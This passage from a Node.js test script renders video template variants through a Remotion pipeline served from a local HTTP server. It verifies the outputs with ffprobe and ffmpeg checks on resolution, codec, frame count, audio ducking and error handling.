    check(r.code === 1 && /approved archive/.test(r.last?.message ?? ''), `security: no archive, no render (${r.last?.message?.slice(0, 120)})`);
  } finally {
    sink.close();
  }
};

// --- 4. render + verify ------------------------------------------------------
const runNode = (script, argv, env) =>
  new Promise((resolve) => {
    const child = spawn(process.execPath, [path.join(VIDEO_DIR, 'render', script), ...argv], {
      cwd: OUT,
      stdio: ['ignore', 'pipe', 'pipe'],
      ...(env && { env: { ...process.env, ...env } }),
    });
    const lines = [];
    let buf = '';
    let lastPct = -1;
    child.stdout.on('data', (d) => {
      buf += d;
      let i;
      while ((i = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, i);
        buf = buf.slice(i + 1);
        if (!line.trim()) continue;
        let obj;
        try {
          obj = JSON.parse(line);
        } catch {
          obj = { type: '__invalid__', line };
        }
        lines.push(obj);
        if (obj.type === 'progress') {
          const pct = Math.floor(obj.progress * 10);
          if (pct !== lastPct || obj.stage === 'bundling') {
            lastPct = pct;
            say(`  ${script} ${obj.stage} ${(obj.progress * 100).toFixed(0)}% rendered=${obj.renderedFrames} encoded=${obj.encodedFrames}`);
          }
        }
      }
    });
    let stderr = '';
    child.stderr.on('data', (d) => {
      stderr += d;
    });
    child.on('close', (code) => resolve({ code, lines, stderr }));
  });

const probe = (file) =>
  JSON.parse(
    execFileSync(FFPROBE, ['-v', 'error', '-show_streams', '-show_format', '-of', 'json', file], { encoding: 'utf8' }),
  );

/** Mean loudness (dB) of the output's audio between two frames. */
const meanDb = (file, a, b) => {
  const r = spawnSync(
    FFMPEG,
    ['-hide_banner', '-ss', String(a / FPS), '-t', String((b - a) / FPS), '-i', file, '-vn', '-af', 'volumedetect', '-f', 'null', '-'],
    { encoding: 'utf8' },
  );
  const m = /mean_volume:\s*(-?[\d.]+) dB/.exec(r.stderr ?? '');
  return m ? Number(m[1]) : NaN;
};

const extractFrames = (file, tag) => {
  fs.mkdirSync(FRAMES, { recursive: true });
  const sel = REVIEW_FRAMES.map(([n]) => `eq(n\\,${n})`).join('+');
  const tmp = path.join(FRAMES, `.${tag}-%02d.png`);
  execFileSync(FFMPEG, ['-hide_banner', '-loglevel', 'error', '-y', '-i', file, '-vf', `select='${sel}'`, '-fps_mode', 'passthrough', tmp]);
  const written = [];
  REVIEW_FRAMES.forEach(([n, label], i) => {
    const src = path.join(FRAMES, `.${tag}-${String(i + 1).padStart(2, '0')}.png`);
    const dst = path.join(FRAMES, `${tag}-${String(n).padStart(4, '0')}-${label}.png`);
    if (fs.existsSync(src)) {
      fs.renameSync(src, dst);
      written.push(dst);
    }
  });
  return written;
};

/** Frames at given numbers, named for review. */
const extractNamedFrames = (file, tag, frames) => {
  fs.mkdirSync(FRAMES, { recursive: true });
  const written = [];
  for (const [n, label] of frames) {
    const dst = path.join(FRAMES, `${tag}-${String(n).padStart(4, '0')}-${label}.png`);
    spawnSync(FFMPEG, ['-hide_banner', '-loglevel', 'error', '-y', '-i', file, '-vf', `select=eq(n\\,${n})`, '-frames:v', '1', dst]);
    if (fs.existsSync(dst)) written.push(dst);
  }
  return written;
};

const verifyRender = (variant, plan, result, outFile) => {
  const { code, lines, stderr } = result;
  check(code === 0, `${variant}: render.mjs exit code 0 (got ${code})`);
  if (code !== 0) say(stderr.split('\n').slice(-30).join('\n'));
  check(lines.every((l) => l.type !== '__invalid__'), `${variant}: every stdout line is JSON`);
  check(lines[0]?.type === 'versions' && lines[0].remotion === '4.0.536', `${variant}: first line is versions (remotion 4.0.536)`);
  const tpl = lines[0]?.templates ?? {};
  check(Object.keys(tpl).length === 15 && Object.values(tpl).every((v) => v === '1'), `${variant}: versions lists 15 templates @1`);
  const progress = lines.filter((l) => l.type === 'progress');
  check(progress.length > 0 && progress.every((p) => p.progress >= 0 && p.progress <= 1), `${variant}: progress lines in 0..1`);
  const done = lines[lines.length - 1];
  check(done?.type === 'done' && done.output === outFile && done.durationInFrames === plan.durationInFrames, `${variant}: last line is done`);
  if (code !== 0 || !fs.existsSync(outFile)) return false;

  const info = probe(outFile);
  const v = info.streams.find((s) => s.codec_type === 'video');
  const a = info.streams.find((s) => s.codec_type === 'audio');
  check(v?.width === plan.width && v?.height === plan.height, `${variant}: ${v?.width}x${v?.height} == ${plan.width}x${plan.height}`);
  check(v?.codec_name === 'h264' && v?.pix_fmt === 'yuv420p', `${variant}: h264 yuv420p (${v?.codec_name} ${v?.pix_fmt})`);
  const frames = Number(v?.nb_frames);
  check(Math.abs(frames - plan.durationInFrames) <= 1, `${variant}: ${frames} frames vs plan ${plan.durationInFrames} (±1)`);
  const dur = Number(v?.duration);
  const want = plan.durationInFrames / plan.fps;
  check(Math.abs(dur - want) <= 1 / plan.fps + 1e-6, `${variant}: video duration ${dur.toFixed(3)}s vs ${want.toFixed(3)}s (±1 frame)`);
  check(a?.codec_name === 'aac', `${variant}: has aac audio (${a?.codec_name ?? 'none'})`);
  // Ducking: c2 has no audio track, so only the music bed plays there.
  // Frames 250-325 have no dialogue; 350-390 sit inside a dialogue range.
  const open = meanDb(outFile, 250, 325);
  const ducked = meanDb(outFile, 350, 390);
  const delta = open - ducked;
  check(Number.isFinite(delta) && delta > 9 && delta < 15, `${variant}: music ducks under dialogue by ${delta.toFixed(1)} dB (expect ~12)`);
  const whole = meanDb(outFile, 0, plan.durationInFrames);
  check(whole > -50, `${variant}: output audio is not silent (mean ${whole} dB)`);
  return true;
};

const main = async () => {
  fs.mkdirSync(OUT, { recursive: true });
  generateMedia();
  const server = await startServer();
  const { port } = server.address();
  const baseUrl = `http://127.0.0.1:${port}`;
  say(`serving ${MEDIA} at ${baseUrl}`);

  // Range sanity check (the Player and Chrome seek with Range requests).
  const rangeRes = await fetch(`${baseUrl}/landscape.mp4`, { headers: { Range: 'bytes=0-99' } });
  check(rangeRes.status === 206 && (await rangeRes.arrayBuffer()).byteLength === 100, 'HTTP server honors Range requests');

  const cache = path.join(VIDEO_DIR, '.bundle-cache');
  const reviewed = [];
  try {
    for (const name of only) {
      if (name === 'transitions' || name === 'splits' || name === 'cuts') {
        const names = name === 'cuts' ? ['cut-hard', 'cut-blend'] : [name];
        for (const n of names) {
          const plan = goPlan(n, baseUrl);
          const propsFile = path.join(OUT, `plan-${n}.json`);
          fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
          const outFile = path.join(OUT, `out-${n}.mp4`);
          say(`rendering ${n} ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
          const t0 = Date.now();
          const result = await runNode('render.mjs', ['--props', propsFile, '--out', outFile, '--bundle-cache', cache]);
          say(`${n} render took ${((Date.now() - t0) / 1000).toFixed(1)}s`);
          if (n === 'transitions') {
            const frames = verifyTransitions(plan, result, outFile);
            if (frames.length) reviewed.push(...extractNamedFrames(outFile, 'transitions', frames));
          } else if (n === 'splits') verifySplits(plan, result, outFile);
          else verifyCut(n, plan, result, outFile);
        }
        if (name === 'cuts' && CLICKS['cut-hard'] && CLICKS['cut-blend']) {
          const h = CLICKS['cut-hard'].cut, bl = CLICKS['cut-blend'].cut;
          const jumpDb = 20 * Math.log10(bl.jump / h.jump);
          check(jumpDb < -6, `cuts: the blend makes the sample jump at the cut ${jumpDb.toFixed(1)} dB smaller (${h.jump.toFixed(3)} → ${bl.jump.toFixed(3)})`);
          check(bl.hf < h.hf - 6, `cuts: and the click's high-frequency energy ${(bl.hf - h.hf).toFixed(1)} dB lower (${h.hf} → ${bl.hf} dB)`);
        }
        continue;
      }
      if (
        name === 'resources' ||
        name === 'nested' ||
        name === 'conversation' ||
        name === 'conversation-names' ||
        name === 'slides' ||
        name === 'slides-vertical' ||
        name === 'name-bar' ||
        name === 'house-style' ||
        name === 'layout-pack'
      ) {
        const plan = goPlan(name, baseUrl);
        const propsFile = path.join(OUT, `plan-${name}.json`);
        fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
        const outFile = path.join(OUT, `out-${name}.mp4`);
        say(`rendering ${name} ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
        MEDIA_HITS.clear();
        const t0 = Date.now();
        const result = await runNode('render.mjs', ['--props', propsFile, '--out', outFile, '--bundle-cache', cache]);
        say(`${name} render took ${((Date.now() - t0) / 1000).toFixed(1)}s`);
        reviewed.push(
          ...(name === 'resources'
            ? verifyResources(plan, result, outFile)
            : name === 'nested'
              ? verifyNested(plan, result, outFile)
              : name === 'conversation'
                ? verifyConversation(plan, result, outFile)
                : name === 'conversation-names'
                  ? verifyConversationNames(plan, result, outFile)
                : name === 'name-bar'
                  ? verifyNameBar(plan, result, outFile)
                  : name === 'house-style'
                    ? verifyHouseStyle(plan, result, outFile)
                    : name === 'layout-pack'
                      ? verifyLayoutPack(plan, result, outFile)
                    : verifySlides(name, plan, result, outFile)),
        );
        continue;
      }
      if (name === 'follow' || name === 'qa-zones') {
        const names = name === 'follow' ? ['follow', 'follow-center'] : ['qa-zones'];
        for (const n of names) {
          const plan = n === 'qa-zones' ? goPlan(n, baseUrl, QA_ZONES) : goPlan(n, baseUrl);
          const propsFile = path.join(OUT, `plan-${n}.json`);
          fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
          const outFile = path.join(OUT, `out-${n}.mp4`);
          say(`rendering ${n} ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
          const t0 = Date.now();
          const result = await runNode('render.mjs', ['--props', propsFile, '--out', outFile, '--bundle-cache', cache]);
          say(`${n} render took ${((Date.now() - t0) / 1000).toFixed(1)}s`);
          reviewed.push(...(n === 'qa-zones' ? verifyZones(plan, result, outFile) : verifyFollow(n, plan, result, outFile)));
        }
        continue;
      }
      if (name === 'sync') {
        await runSync(baseUrl, cache);
        continue;
      }
      if (name === 'motion') {
        reviewed.push(...(await runMotion(baseUrl)));
        continue;
      }
      if (name === 'motion-resources') {
        reviewed.push(...(await runMotionResources(baseUrl)));
        continue;
      }
      if (name === 'motion-security') {
        await runMotionSecurity(baseUrl);
        continue;
      }
      if (name === 'sound') {
        const plan = buildSoundPlan(baseUrl);
        const propsFile = path.join(OUT, 'plan-sound.json');
        fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
        const outFile = path.join(OUT, 'out-sound.mp4');
        say(`rendering sound ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
        const result = await runNode('render.mjs', ['--props', propsFile, '--out', outFile, '--bundle-cache', cache]);
        verifySound(plan, result, outFile);
        continue;
      }
      if (name === 'mix') {
        const plan = buildMixPlan(baseUrl);
        const propsFile = path.join(OUT, 'plan-mix.json');
        fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
        const outFile = path.join(OUT, 'out-mix.mp4');
        say(`rendering mix ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
        const t0 = Date.now();
        const result = await runNode('render.mjs', ['--props', propsFile, '--out', outFile, '--bundle-cache', cache]);
        say(`mix render took ${((Date.now() - t0) / 1000).toFixed(1)}s`);
        verifyMix(plan, result, outFile);
        continue;
      }
      const spec = VARIANTS[name];
      if (!spec) throw new Error(`unknown variant ${name}`);
      const plan = buildPlan(spec, baseUrl);
      const propsFile = path.join(OUT, `plan-${name}.json`);
      fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
      const outFile = path.join(OUT, `out-${name}.mp4`);
      say(`rendering ${name} ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
      const t0 = Date.now();
      const result = await runNode('render.mjs', ['--props', propsFile, '--out', outFile, '--bundle-cache', cache]);
      say(`${name} render took ${((Date.now() - t0) / 1000).toFixed(1)}s`);
      if (verifyRender(name, plan, result, outFile)) reviewed.push(...extractFrames(outFile, name));
    }

    if (!args['skip-stills']) {
      const plan = buildPlan(VARIANTS.square, baseUrl);
      const propsFile = path.join(OUT, 'plan-square.json');
      fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
      for (const [n, label] of [[48, 'title'], [150, 'lowerthird-clean-right'], [318, 'quote'], [470, 'cinematic-center'], [585, 'datacard'], [660, 'endcard']]) {
        const out = path.join(FRAMES, `square-${String(n).padStart(4, '0')}-${label}.png`);
        const r = await runNode('still.mjs', ['--props', propsFile, '--frame', String(n), '--out', out, '--bundle-cache', cache]);
        const last = r.lines[r.lines.length - 1];
        check(r.code === 0 && last?.type === 'done' && fs.existsSync(out), `square still frame ${n} (${label})`);
        if (r.code !== 0) say(r.stderr.split('\n').slice(-15).join('\n'));
        else reviewed.push(out);
      }
    }

    // Contract: invalid props fail with a JSON error line and exit code 1.
    const bad = path.join(OUT, 'plan-invalid.json');
    fs.writeFileSync(bad, JSON.stringify({ plan: { ...buildPlan(VARIANTS.vertical, baseUrl), sources: {} } }));
    const r = await runNode('render.mjs', ['--props', bad, '--out', path.join(OUT, 'never.mp4'), '--bundle-cache', cache]);
    const last = r.lines[r.lines.length - 1];
    check(r.code === 1 && last?.type === 'error' && /sources/.test(last.message), `invalid props -> exit 1 + error line ("${last?.message}")`);
  } finally {
    server.close();
  }

  say('review frames:');
  for (const f of reviewed) say(`  ${f}`);
  say(failures === 0 ? 'ALL CHECKS PASSED' : `${failures} CHECK(S) FAILED`);
  process.exit(failures === 0 ? 0 : 1);
};

main().catch((e) => {
  say(e.stack ?? String(e));
  process.exit(1);
});
